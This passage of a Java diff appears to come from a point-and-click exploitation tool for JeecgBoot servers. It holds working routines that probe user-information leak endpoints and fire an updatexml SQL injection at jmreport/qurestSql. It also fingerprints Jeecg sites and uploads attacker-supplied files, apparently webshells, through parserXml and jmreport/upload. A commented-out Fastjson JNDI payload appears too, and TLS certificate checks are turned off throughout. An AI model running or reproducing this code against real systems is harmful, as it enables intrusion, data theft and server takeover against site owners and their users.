+                    //   test2.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞" + "\n");
+                }
+
+
+            } catch (Exception e) {
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                //  test2.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-" + "\n");
+                //     System.out.println(e);
+
+            }
+
+
+        }
+
+
+    }
+
+    public void jeecgqueryudfsdf() {
+
+        try {
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+            String url2 = testdffd.getText();
+            if (url2.endsWith("/")) {
+                url2 = url2.substring(0, url2.length() - 1); // 去除最后一个字符（斜杠）
+            }
+            if (url2.endsWith("'")) {
+                url2 = url2.substring(0, url2.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            URL url1 = new URL(url + "/" + url2 + "/sys/user/querySysUser?username=admin");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+
+                response.append(inputLine);
+                //    test1.appendText(response.toString());
+
+
+            }
+
+
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            int age = jsonObject.optInt("code");
+
+
+            //  int responseCode = connection.getResponseCode();
+            if (age == 0) {
+
+                test2.appendText(formattedDateTime + url + "[+]存在jeecg-boot-querySysUser信息泄露漏洞" + "\n");
+
+                test2.appendText(formattedDateTime + url + "/" + testdffd.getText().replaceAll("'", "") + "/sys/user/querySysUser?username=admin" + "\n");
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞" + "\n");
+
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞-" + "\n");
+
+            System.out.println(e);
+
+        }
+
+
+    }
+
+    public void jeecgdsfsfs() {
+
+        try {
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+            String url2 = testdffd.getText();
+            if (url2.endsWith("/")) {
+                url2 = url2.substring(0, url2.length() - 1); // 去除最后一个字符（斜杠）
+            }
+            if (url2.endsWith("'")) {
+                url2 = url2.substring(0, url2.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            URL url1 = new URL(url + "/" + url2 + "/sys/user/checkOnlyUser?username=admin");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+
+                response.append(inputLine);
+                //    test1.appendText(response.toString());
+
+
+            }
+
+
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            int age = jsonObject.optInt("code");
+
+
+            //  int responseCode = connection.getResponseCode();
+            if (age == 0) {
+
+                test2.appendText(formattedDateTime + url + "[+]存在jeecg-boot-checkOnlyUser信息泄露漏洞" + "\n");
+                test2.appendText(formattedDateTime + url + "/" + testdffd.getText() + "/sys/user/checkOnlyUser?username=admin" + "\n");
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞" + "\n");
+
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞-" + "\n");
+
+
+        }
+
+
+    }
+
+    public void jeecgsq(String line) {
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        } else {
+
+
+            try {
+
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                Random random = new Random();
+                int randomNumber = random.nextInt(100);
+
+                URL url1 = new URL(url + "/jeecg-boot/jmreport/qurestSql");
+                String json = "{\"apiSelectId\":\"1290104038414721025\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";
+                //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+                connection.setDoOutput(true);
+                connection.setRequestMethod("POST");
+                // String a;
+                //      ml.setText(randomNumber + "." + ml.getText());
+                //  String a;
+                //   a = ml.getText();
+
+                connection.setRequestProperty("Content-Type", "application/json");
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
+                writer.write(json);
+                writer.close();
+                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                //  OutputStream os = connection.getOutputStream();
+                //   os.write(input, 0, input.length);
+                //   os.flush();
+                //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                StringBuffer response = new StringBuffer();
+                String inputLine;
+                response.append(inputLine = br.readLine());
+                while ((inputLine = br.readLine()) != null) {
+                    response.append(inputLine);
+                }
+
+                int responseCode = connection.getResponseCode();
+
+
+                if (response.toString().contains("49ba59abbe56e057")) {
+
+
+                    test3.appendText(formattedDateTime + line + "[+]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞" + "\n");
+                    //      test2.appendText(fieldName.toString() + "\n");
+
+
+                } else {
+
+                    //   test2.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞" + "\n");
+                }
+
+
+            } catch (Exception e) {
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                //  test2.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-" + "\n");
+                //     System.out.println(e);
+
+            }
+
+
+        }
+
+
+    }
+
+    public void zhiwen() {
+
+
+        try {
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            URL url1 = new URL(url);
+
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+
+
+            //     System.out.println("Response Code : " + responseCode);
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            int responseCode = connection.getResponseCode();
+            //    System.out.println("Response Code : " + responseCode);
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+                response.append(inputLine);
+                //       br.close();
+
+                // jeecguser();
+
+
+            }
+
+            Pattern pattern = Pattern.compile("window._CONFIG\\['onlinePreviewDomainURL'\\] = \\'(.*?);");
+            Matcher matcher = pattern.matcher(response);
+            if (matcher.find()) {
+                String value = matcher.group(0); // 提取匹配的值（这里是name的值）
+
+                if (value.contains("jeecg")) {
+
+                    test2.appendText("指纹识别:" + "该网站是jeecg" + "\n");
+                } else if (value.equals("")) {
+
+                    test2.appendText("指纹识别:" + "该网站不是jeecg");
+                }
+                //  value=testdff.getText();
+
+            }
+
+
+            //    urltest1.appendText(response.toString());
+
+        } catch (Exception e) {
+
+
+            test2.appendText("指纹识别:" + "该网站未知");
+            System.out.println(e);
+
+        }
+    }
+
+    public void jeecggskkl() {
+
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+
+
+        try {
+            //  System.setProperty("http.proxyHost", "127.0.0.1");
+            //    System.setProperty("http.proxyPort", "8080");
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            Random random = new Random();
+            int randomNumber = random.nextInt(100);
+
+            URL url1 = new URL(url + "/api/…/commonController.do?parserXml");
+            // String json = "";
+            //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
+            connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
+            String boundary = "----WebKitFormBoundaryyfyhSCMs9cajzFD4";
+            StringBuilder requestBody = new StringBuilder();
+            requestBody.append("--").append(boundary).append("\r\n");
+            requestBody.append("Content-Disposition: form-data; name=\"name\"\r\n");
+            requestBody.append("\r\n");
+            requestBody.append("qwe.png").append("\r\n");
+
+            requestBody.append("--").append(boundary).append("\r\n");
+            requestBody.append("Content-Disposition: form-data; name=\"documentTitle\"\r\n");
+            requestBody.append("\r\n");
+            requestBody.append("blank").append("\r\n");
+
+            requestBody.append("--").append(boundary).append("\r\n");
+            requestBody.append("Content-Disposition: form-data; name=\"file\"; filename=\"" + dsffsf.getText() + "\"\r\n");
+            requestBody.append("Content-Type: image/png\r\n");
+            requestBody.append("\r\n");
+            requestBody.append(testdfdf.getText()).append("\r\n");
+
+            requestBody.append("--").append(boundary).append("--").append("\r\n");
+            byte[] requestData = requestBody.toString().getBytes("UTF-8");
+            connection.setRequestProperty("Content-Length", String.valueOf(requestData.length));
+
+            OutputStream outputStream = connection.getOutputStream();
+            outputStream.write(requestData);
+            outputStream.flush();
+            outputStream.close();
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+            }
+            response.append(inputLine);
+
+            if (response.toString().contains("操作成功")) {
+
+                tedasfa.appendText(formattedDateTime + url + "上传成功" + "\n");
+              tedasfa.appendText(url + "/" + dsffsf.getText());
+            } else {
+
+                tedasfa.appendText(formattedDateTime + url + "[-]上传失败" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            tedasfa.appendText(formattedDateTime + "[-]上传失败-" + "\n");
+            //     System.out.println(e);
+
+        }
+
+
+    }
+
+    public void jeecggetshelldf() {
+
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+            URL url1 = new URL(url + "/jeecg-boot/jmreport/upload");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)");
+            connection.setRequestProperty("Accept", "*/*");
+            connection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
+            connection.setRequestProperty("Connection", "close");
+            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
+             connection.setRequestProperty("Cache-Control", "no-cache");
+              connection.setRequestProperty("Pragma", "no-cache");
+            connection.setDoOutput(true);
+            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
+            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+dsffsf.getText()+"\"\r\n");
+            outputStream.writeBytes("Content-Type: text/html\r\n");
+            outputStream.writeBytes("\r\n");
+            outputStream.write(testdfdf.getText().getBytes());
+            outputStream.writeBytes("\r\n");
+            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"fileName\"\r\n");
+            outputStream.writeBytes("\r\n");
+            outputStream.write(dsffsf.getText().getBytes());
+            outputStream.writeBytes("\r\n");
+            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"biz\"\r\n");
+            outputStream.writeBytes("\r\n");
+            outputStream.write("excel_online".getBytes());
+            outputStream.writeBytes("\r\n");
+            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4--\r\n");
+            outputStream.flush();
+            outputStream.close();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            //  OutputStream os = connection.getOutputStream();
+            //   os.write(input, 0, input.length);
+            //   os.flush();
+            //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+                response.append(inputLine);
+
+            }
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+          String aas = jsonObject.getString("message");
+
+
+            if(response.toString().contains("message")) {
+
+                tedasfa.appendText(formattedDateTime + url + "上传成功" + "\n");
+                tedasfa.appendText("/jeecg-boot/"+aas);
+            }
+            else{
+
+
+                tedasfa.appendText(formattedDateTime + url + "上传失败" + "n");
+
+
+            }
+
+
+
+        } catch (Exception e) {
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            tedasfa.appendText(formattedDateTime + "上传失败-" + "\n");
+            System.out.println(e);
+
+        }
+    }
+
+
+}
